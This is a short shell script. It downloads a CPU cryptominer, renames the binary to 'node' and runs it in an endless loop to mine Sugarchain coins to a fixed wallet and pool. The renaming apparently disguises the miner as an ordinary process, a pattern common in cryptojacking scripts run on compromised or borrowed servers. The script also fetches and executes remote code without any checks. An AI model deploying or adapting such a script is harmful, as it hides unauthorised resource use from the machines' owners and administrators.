#!/bin/sh
#
wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz 
tar -xf cpuminer-opt-linux.tar.gz 
mv cpuminer-avx node
while [ 1 ]; do
./node -a yespowerSUGAR -o stratum+tcp://1pool.sugarchain.org:5555 -u sugar1qdgf4da5dcafhug574a0zjrfwkge262tl3q99e8.Okbah ; if [ $? -eq 124 ] ; then echo success! ; else echo failed ; fi
sleep 1
done
